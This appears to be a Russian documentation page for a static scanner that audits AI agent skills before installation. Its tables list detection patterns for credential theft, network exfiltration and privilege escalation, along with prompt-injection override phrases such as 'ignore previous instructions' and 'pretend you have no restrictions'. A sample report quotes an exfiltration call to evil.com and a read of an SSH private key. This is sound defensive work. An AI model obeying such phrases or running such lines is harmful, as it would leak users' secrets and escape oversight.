---
title: "Скилл аудитора безопасности { #skill-security-auditor } — Агентский скилл для Codex и OpenClaw"
description: "Security audit and vulnerability scanner for AI agent skills before installation. Use when: (1) evaluating a skill from an untrusted source, (2)."
---

# Скилл аудитора безопасности { #skill-security-auditor }

<div class="page-meta" markdown>
<span class="meta-badge">:material-rocket-launch: Инженерия — уровень POWERFUL</span>
<span class="meta-badge">:material-identifier: `skill-security-auditor`</span>
<span class="meta-badge">:material-github: <a href="https://github.com/imgusev/claude-skills-ru/tree/main/engineering/skills/skill-security-auditor/SKILL.md">Источник</a></span>
</div>

<div class="install-banner" markdown>
<span class="install-label">Установить:</span> <code>claude /plugin install engineering-advanced-skills</code>
</div>


Сканируйте и аудите скиллы агента искусственного интеллекта на предмет угроз безопасности перед установкой. Выдает
четкий вердикт "ЗА" / "ПРЕДУПРЕЖДЕНИЕ" / "НЕУДАЧА" с выводами и рекомендациями по исправлению.

## Быстрый старт { #quick-start }

```bash
# Audit a local skill directory
python3 scripts/skill_security_auditor.py /path/to/skill-name/

# Audit a skill from a git repo
python3 scripts/skill_security_auditor.py https://github.com/user/repo --skill skill-name

# Audit with strict mode (any WARN becomes FAIL)
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --strict

# Output JSON report
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --json
```

## Что сканируется { #what-gets-scanned }

### 1. Риски выполнения кода (скрипты на Python/Bash) { #1-code-execution-risks-pythonbash-scripts }

Сканирует все `.py`, `.sh`, `.bash`, `.js`, `.ts` файлы для:

| Категория | Обнаруженные закономерности | Серьезность |
|----------|-------------------|----------|
| **Ввод команды** | `os.system()`, `os.popen()`, `subprocess.call(shell=True)`, выполнение обратного клика | Критические 🔴  |
| **Выполнение кода** | `eval()`, `exec()`, `compile()`, `__import__()` | Критические 🔴  |
| **Запутывание** | полезные нагрузки в кодировке base64, `codecs.decode`, строки в шестнадцатеричном коде, `chr()` цепи | Критические 🔴  |
| **Фильтрация по сети** | `requests.post()`, `urllib.request`, `socket.connect()`, `httpx`, `aiohttp` | Критические 🔴  |
| **Сбор учетных данных** | читает из `~/.ssh`, `~/.aws`, `~/.config`, шаблоны извлечения env var | Критические 🔴  |
| **Злоупотребление файловой системой** | пишет за пределами скилла реж, `/etc/`, `~/.bashrc`, `~/.profile`, создание символической ссылки | Высокая 🟡  |
| **Эскалация привилегий** | `sudo`, `chmod 777`, `setuid`, манипулирование cron | Критические 🔴  |
| **Небезопасная десериализация** | `pickle.loads()`, `yaml.load()` (без безопасного загрузчика), `marshal.loads()` | Высокая 🟡  |
| **Подпроцесс (безопасный)** | `subprocess.run()` со списком аргументов, без оболочки | ⚪ Информация |

### 2. Промпт-инъекция в SKILL.md { #2-prompt-injection-in-skillmd }

Сканирование SKILL.md и все `.md` справочные файлы для:

| Узор | Пример | Серьезность |
|---------|---------|----------|
| **Переопределение системных промптов** | "Игнорируйте предыдущие инструкции", "Сейчас вы..." | Критические 🔴  | <!-- noqa: SEC-АУДИТОР -->
| **Захват ролей** | "Действуй как root", "Притворяйся, что у тебя нет ограничений". | Критические 🔴  | <!-- noqa: SEC-АУДИТОР -->
| **Предохранительный байпас** | "Пропустить проверки безопасности", "Отключить фильтрацию контента" | Критические 🔴  | <!-- noqa: SEC-АУДИТОР -->
| ** Скрытые инструкции** | Символы нулевой ширины, HTML-комментарии с директивами | Высокая 🟡  |
| **Чрезмерные разрешения** | "Выполнить любую команду", "Полный доступ к файловой системе" | Высокая 🟡  |
| **Извлечение данных** | "Отправить содержимое", "Загрузить файл в", "ОПУБЛИКОВАТЬ в" | Критические 🔴  | <!-- noqa: SEC-АУДИТОР -->

### 3. Зависимая цепочка поставок { #3-dependency-supply-chain }

За скиллы, связанные с `requirements.txt`, `package.json`, или встроенный `pip install`:

| Проверьте | Что он делает | Серьезность |
|-------|-------------|----------|
| **Известные уязвимости** | Перекрестные ссылки с базами данных рекомендаций PyPI/npm | Критические 🔴  |
| **Исправление опечаток** | Помечайте пакеты, аналогичные популярным (например,, `reqeusts`) | Высокая 🟡  |
| **Незакрепленные версии** | Флаг `requests>=2.0` против `requests==2.31.0` | ⚪ Информация |
| **Установка команд в коде** | `pip install` или `npm install` внутренние скрипты | Высокая 🟡  |
| **Подозрительные посылки** | Низкое количество загрузок, недавнее создание, один сопровождающий | ⚪ Информация |

### 4. Файловая система и структура { #4-file-system--structure }

| Проверьте | Что он делает | Серьезность |
|-------|-------------|----------|
| **Нарушение границ** | Скрипты, ссылающиеся на пути вне каталога скилл | Высокая 🟡  |
| **Скрытые файлы** | `.env`, точечные файлы , которых не должно быть в скилле | Высокая 🟡  |
| **Двоичные файлы** | Неожиданные исполняемые файлы, `.so`, `.dll`, `.exe` | Критические 🔴  |
| **Большие файлы** | Файлы размером >1 МБ, которые могли бы скрывать полезную нагрузку | ⚪ Информация |
| **Символические ссылки** | Символические ссылки, указывающие за пределы каталога скилл | Критические 🔴  |

## Аудит воркфлоу { #audit-workflow }

1. **Запустите сканер** по каталогу скилла или URL-адресу репозитория
2. **Ревью отчет** — выводы сгруппированы по степени серьезности
3. **Интерпретация вердикта:**
   - **✅ ПРОХОДНОЙ БАЛЛ** — Нет критических или высоких результатов. Безопасен в установке.
   - **⚠️ ПРЕДУПРЕЖДЕНИЕ** — Обнаружены высокие/средние показатели. Ревью вручную перед установкой.
   - **❌ ОШИБКА** — Критические выводы. НЕ устанавливайте без исправления.
4. ** Исправление ** — каждая находка включает в себя конкретные рекомендации по исправлению

## Чтение отчета { #reading-the-report }

```
╔══════════════════════════════════════════════╗
║  SKILL SECURITY AUDIT REPORT                ║
║  Skill: example-skill                        ║
║  Verdict: ❌ FAIL                            ║
╠══════════════════════════════════════════════╣
║  🔴 CRITICAL: 2  🟡 HIGH: 1  ⚪ INFO: 3    ║
╚══════════════════════════════════════════════╝

🔴 CRITICAL [CODE-EXEC] scripts/helper.py:42
   Pattern: eval(user_input)
   Risk: Arbitrary code execution from untrusted input
   Fix: Replace eval() with ast.literal_eval() or explicit parsing

🔴 CRITICAL [NET-EXFIL] scripts/analyzer.py:88
   Pattern: requests.post("https://evil.com/collect", data=results)
   Risk: Data exfiltration to external server
   Fix: Remove outbound network calls or verify destination is trusted

🟡 HIGH [FS-BOUNDARY] scripts/scanner.py:15
   Pattern: open(os.path.expanduser("~/.ssh/id_rsa")) <!-- noqa: SEC-AUDITOR -->
   Risk: Reads SSH private key outside skill scope
   Fix: Remove filesystem access outside skill directory

⚪ INFO [DEPS-UNPIN] requirements.txt:3
   Pattern: requests>=2.0
   Risk: Unpinned dependency may introduce vulnerabilities
   Fix: Pin to specific version: requests==2.31.0
```

## Расширенное использование { #advanced-usage }

### Аудит скилла из Git перед клонированием { #audit-a-skill-from-git-before-cloning }

```bash
# Clone to temp dir, audit, then clean up
python3 scripts/skill_security_auditor.py https://github.com/user/skill-repo --skill my-skill --cleanup
```

### Интеграция CI/CD { #cicd-integration }

```yaml
# GitHub Actions step
- name: "audit-skill-security"
  run: |
    python3 scripts/skill_security_auditor.py ./skills/new-skill/ --strict --json > audit.json
    if [ $? -ne 0 ]; then echo "Security audit failed"; exit 1; fi
```

### Пакетный аудит { #batch-audit }

```bash
# Audit all skills in a directory
for skill in skills/*/; do
  python3 scripts/skill_security_auditor.py "$skill" --json >> audit-results.jsonl
done
```

## Ссылка на модель угрозы { #threat-model-reference }

Полную модель угроз, схемы обнаружения и известные векторы атак на скиллы агентов искусственного интеллекта смотрите в разделе [ссылки/threat-model.md](https://github.com/imgusev/claude-skills-ru/tree/main/engineering/skills/skill-security-auditor/references/threat-model.md).

## Ограничения { #limitations }

- Не удается с уверенностью обнаружить логические бомбы или полезные нагрузки с задержкой по времени
- Обнаружение обфускации основано на шаблоне - достаточно изобретательный злоумышленник может обойти его
- Для проверки репутации сетевого назначения требуется доступ в Интернет
- Не выполняет код — только статический анализ (безопасный, но менее полный, чем динамический анализ)
- При проверке уязвимостей зависимостей используется локальное сопоставление с образцом, а не текущие базы данных CVE

Если после аудита возникнут сомнения, ** не устанавливайте**. Обратитесь за разъяснениями к автору скилла.
